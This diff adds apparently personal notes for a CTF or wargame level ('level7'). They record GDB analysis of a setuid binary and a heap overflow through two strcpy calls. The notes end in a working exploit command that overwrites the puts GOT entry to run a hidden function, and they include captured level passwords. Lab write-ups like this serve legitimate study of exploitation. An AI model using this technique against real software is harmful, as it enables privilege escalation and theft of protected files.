@@ -1,0 +1,186 @@
+login : pw
+	level7 : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+disas main
+	=> stack allocated = 0x20
+	=> malloc called (0x8) => stored in esp+0x1c (let s call this location m1)
+	=> m1[0] is assigned the value 1
+	=> malloc called (0x8) => stored in edx at first
+	=> stores edx in *(eax + 0x4), eax from *(esp + 0x1c) which was m1
+		=> new pointer stored in m1 + 1
+	=> malloc called (0x8) => stored in esp+0x18 (lets call this location m2)
+	m2[0] is assigned value 2
+	=> malloc called (0x8) => stored in edx at first
+	stored edx in *(eax+0x4), eax from *(esp+0x18) which was m2
+		=> new pointer in m2 + 1
+	strcpy called
+		=> esp+0x4 <= edx <= eax <= *eax <= eax+0x4 <= ebp+0xc
+			=> ebp+0xc = argv
+			=> eax + 0x4 = argv + 1
+			=> *eax = argv[1]
+				=> second param is argv[1]
+		=> esp <= eax <= *(eax+0x4) <= *(esp+0x1c) (location for m1)
+			=> m1 => m1[1]
+				=> first param is m1[1]
+	strcpy called
+		=> Second param
+			=> All similar except eax + 0x8 => argv + 2
+		=> First param
+			=> All similar except *(esp+0x18) (location  for m2)
+				=> m2[1]
+	fopen called
+		=> esp+0x4 = 0x80486e9
+			x/s 0x80486e9
+				=> "r"
+		=> esp = 0x80486eb
+			x/s 0x80486eb
+				=> "/home/user/level8/.pass"
+	fgets called
+		=> esp + 0x8 = return from fopen
+		=> esp +0x4 = 0x44 = 68
+		=> esp = 0x8049960 (output string address)
+			=> global variable c
+	puts called with 0x8048703
+		=> x/s 0x8048703
+			=> "~~"
+
+Summary:
+	=> We open the .pass file and store the content in a global var c
+	=> There is a puts of random string after
+	=> There are 2 strcpy first which is a vulnerable function
+
+info func
+	=> 0x080484f4  m
+		=> I really need to check first levels ahahah
+
+disas m
+	=> call to time, I dont really care
+	=> call to printf:
+		=> time ret value
+		=> 0x8049960 => global var c
+		=> 0x80486e0 => "%s - %d\n"
+
+Ok lets sum up:
+	=> 2 strcpy calls which are vulnerable
+	=> 2 mallocs that are taken into account for the strcpy (2nd and 4th)
+	=> A fgets that opens and stores the flag into global var c
+	=> A not called function m() that displays the global var c
+
+b *main + 47
+	=> After 2nd malloc
+b *main + 94
+	=> After 4th malloc
+
+run aaaabbb ccccddd
+p/x $eax
+	2nd malloc address = 0x804a018
+	4th malloc address = 0x804a038
+
+1st strcpy with 2nd malloc
+2nd strcpy with 4th malloc
+
+delete
+	=> delete breakpoints
+
+b *main+127
+	=> Before first strcpy
+b *main+132
+	=> After first strcpy
+
+r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbb
+
+x/2xw $esp
+	0xbffff5d0:	0x0804a018	0xbffff7ec
+	=> params sent to strcpy
+		=> param1 = 2nd malloc address
+		=> param2 = argv[1] address
+			=> x/s 0xbffff7ec
+				=> 0xbffff7ec:	 'a' <repeats 68 times>
+
+b *main+156
+	=> Before second strcpy
+b *main+161
+	=> After second strcpy
+
+continue
+
+x/32xw $esp
+	=> 0xbffff5d0:	0x61616161	0xbffff831	0xb7fd0ff4	0xb7e5ee55
+		=> Our a's overwrote m2[1]
+		=> x/s 0xbffff831
+			=> "bbbb"
+		=> The address it points to will be overwritten
+
+gdb-peda
+	pattern create 50
+		=> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
+
+r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' 'bbbb'
+
+x/2xw $esp
+	=> 0xbffff5e0:	0x41412d41	0xbffff831
+		=> 41 is A, 2d is - + little endian so A-AA
+
+pattern offset in gdb-peda
+	=> 20
+
+Let's confirm:
+	r $(python -c 'print "a"*20 + "cccc"') bbbb
+	x/2xw $esp
+		=> 0xbffff5f0:	0x63636363	0xbffff831
+			=> perfect we have our cccc
+			=> We can put an address here that will be overwritten by the strcpy
+
+So now I have 2 options:
+	=> custom shell code in environment variables
+		=> overwrite rip within shellcode nopsled using
+			=> that would look something like
+				=> r $(python -c 'print "a" * 20 + rip_address') shellcode_nopsled_address
+					=> I did something similar for level2 something like this so Ill try the other way
+	=> overwrite the puts address
+
+disas main
+	=> 0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+
+disas 0x8048400
+	=> 0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+		=> data segment
+			=> we can try to overwrite it
+	=> 0x08048406 <+6>:	push   0x28
+
+x 0x8049928
+	=> 0x8049928 <puts@got.plt>:	0x08048406
+		=> It contains the following instruction in puts()
+
+So overwriting this value with m function address should make the job
+
+p m
+	=> 0x80484f4 (0x080484f4)
+
+Let's create our payload
+Remember:
+	=> Last 4 bytes of argv[1] overwrites m2[1] (destination of copy)
+	=> First 4 bytes of argv[2] is written into dest
+Let's make our dest the address of puts data segment and overwrite it with m address
+
+r $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+	=> segfault on fgets 
+	=> All previous segfault in '??'
+
+Lets try outside to get suid activated
+./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+	=> 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+
+
+
+
+
+
+
+
+
+
+
+
+
